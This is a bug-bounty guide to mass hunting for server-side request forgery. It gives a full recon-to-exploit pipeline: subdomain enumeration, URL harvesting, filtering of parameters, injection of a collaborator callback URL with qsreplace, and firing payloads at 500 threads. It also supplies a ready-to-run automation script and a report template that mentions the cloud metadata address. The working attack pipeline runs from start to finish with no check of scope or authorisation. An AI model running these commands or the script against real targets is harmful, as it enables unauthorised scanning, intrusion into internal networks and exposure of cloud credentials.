# Complete SSRF Hunting Workflow Guide  
**Beginner to Pro • GitHub-Ready • Colorful • Report-Ready**

**Target Example:** `example.test000.com` (replace with your real target)  
**Time:** 1–2 hours  
**Tools:** 100% free & open-source  

---

## The Full SSRF Pipeline

```
Subdomain Enum → Deduplicate → Live Probe → URL Collection → Filter Params → Inject Payload → Test → Win Bounty
      ↓               ↓            ↓            ↓              ↓             ↓          ↓        ↓
   (Wide Net)     (Clean List)   (Alive)     (10k+ URLs)    (Only =)     (Collaborator)  (Hits!)  ($$$)
```

---

### 1. Subdomain Enumeration (Find Everything)

```bash
subfinder -d example.test000.com -o subfinder.txt
amass enum -passive -d example.test000.com -o amass.txt
assetfinder --subs-only example.test000.com > assetfinder.txt
```

### 2. Deduplicate Subdomains

```bash
cat subfinder.txt amass.txt assetfinder.txt | sort -u > domains.txt
```

### 3. Probe Live Hosts

```bash
cat domains.txt | httpx -silent -threads 300 > live.txt
```

### 4. Collect All URLs (Historical + Live)

```bash
cat live.txt | gau --subs > gau.txt
katana -list live.txt -silent -jc -d 3 -rl 150 > katana.txt
cat live.txt | waybackurls > wayback.txt
```

### 5. Merge & Clean URLs

```bash
cat gau.txt katana.txt wayback.txt | sort -u > all_urls.txt
```

### 6. Filter Parameterized URLs (SSRF Sweet Spot)

```bash
# All params
cat all_urls.txt | grep "=" > params.txt

# Only juicy SSRF params (recommended)
cat all_urls.txt | grep -E "(url|file|path|next|redirect|dest|return|callback|image|src|data|uri|endpoint)" > juicy_params.txt
```

### 7. Inject Your Collaborator Payload

```bash
# Replace with your real Burp/Interactsh/Oastify domain
cat juicy_params.txt | qsreplace "http://yourcollab.oastify.com" > ssrf_payloads.txt
```

### 8. Fire All Payloads

```bash
cat ssrf_payloads.txt | httpx -silent -fr -threads 500 -timeout 15
```

Check your Collaborator → Any DNS/HTTP hit = **SSRF confirmed!**

### 9. Safe Batch Mode (Optional)

```bash
split -l 3000 ssrf_payloads.txt batch_
for f in batch_*; do cat "$f" | httpx -fr -silent -rl 100; sleep 2; done
```

---

### 10. Professional Report Template (Copy-Paste Ready)

``markdown
# SSRF (Server-Side Request Forgery) - Critical

## Summary
The application fetches arbitrary URLs supplied by the user without validation, resulting in a full Server-Side Request Forgery vulnerability.

## Severity
**Critical** (CVSS 9.8)

## Affected Endpoints
- https://api.example.test000.com/fetch?url=PAYLOAD
- https://internal.example.test000.com/proxy?target=PAYLOAD

## Steps to Reproduce
1. Performed subdomain enumeration using `subfinder`, `amass`, and `assetfinder`
2. Identified live hosts with `httpx`
3. Collected URLs using `gau`, `katana`, and `waybackurls`
4. Filtered URLs containing query parameters
5. Replaced parameter values with a Burp Collaborator payload using `qsreplace`
6. Sent requests using `httpx -fr`
7. Received DNS and HTTP interactions from internal IP ranges

## Proof
- Collaborator domain: `abc123def.oastify.com`
- Interaction from internal IP: `10.37.133.7`
- Screenshots & logs attached

## Impact
- Full internal network access
- Cloud metadata service reachable (`169.254.169.254`)
- Potential RCE via chained exploits

## Recommendations
- Strict domain allow-listing
- Block internal IPs and localhost
- Reject `file://`, `gopher://`, etc.
```

---

### One-Click Automation Script (ssrf_hunt.sh)

```bash
#!/bin/bash
TARGET=$1
COLLAB=$2

echo "[+] SSRF Hunt → $TARGET"

subfinder -d $TARGET -o s1.txt
amass enum -passive -d $TARGET -o s2.txt
assetfinder --subs-only $TARGET > s3.txt

cat s1.txt s2.txt s3.txt | sort -u | httpx -silent > live.txt

cat live.txt | gau --subs > gau.txt
katana -list live.txt -silent -jc -d 3 > katana.txt
cat live.txt | waybackurls > wayback.txt

cat gau.txt katana.txt wayback.txt | sort -u | grep "=" | qsreplace "http://$COLLAB" > payloads.txt

echo "[+] Firing payloads... Check Collaborator!"
cat payloads.txt | httpx -fr -silent -threads 500

echo "Done! Go claim that bounty!"
```

**Run:**
```bash
chmod +x ssrf_hunt.sh
./ssrf_hunt.sh example.test000.com yourcollab.oastify.com
```

---



Happy hunting!

